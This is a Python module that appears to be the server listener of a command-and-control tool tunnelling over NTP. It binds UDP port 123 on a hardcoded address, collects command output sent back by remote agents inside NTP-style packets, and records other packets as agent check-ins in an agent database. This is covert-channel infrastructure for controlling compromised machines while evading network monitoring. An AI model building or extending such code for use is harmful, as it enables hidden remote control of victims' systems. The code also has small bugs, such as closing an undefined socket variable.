"""
sole purpose is to listen consistenty for NTP traffic
if resync is recieved, send to ntpserver.py
if cmdoutput is received, send to c2.py
"""
import socket
import datetime
from server import ntpserver, c2


def start(agentDB):
    serverip = "129.21.103.180" #TODO change to get my ip
    port = 123

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((serverip, port))


    datahold = ""
    while True:
        print(datahold)
        data, addr = sock.recvfrom(2048)
        ip = addr[0]
        #print(data, addr)

        strdata = c2.decode(data)

        if "COM" in strdata:
            print(strdata)
            idx = strdata.index("COM")
            datahold += strdata[idx+4:]
            print(datahold)
            if "COMQ" in strdata:
                c2.printOutput(datahold, ip)
                datahold = ""

        else: #this means resync/ping
            timestamp = "{:%Y-%m-%d %H:%M:%S}".format(datetime.datetime.now())
            ntpserver.resyncReceived(timestamp, ip, agentDB)


    s.close()


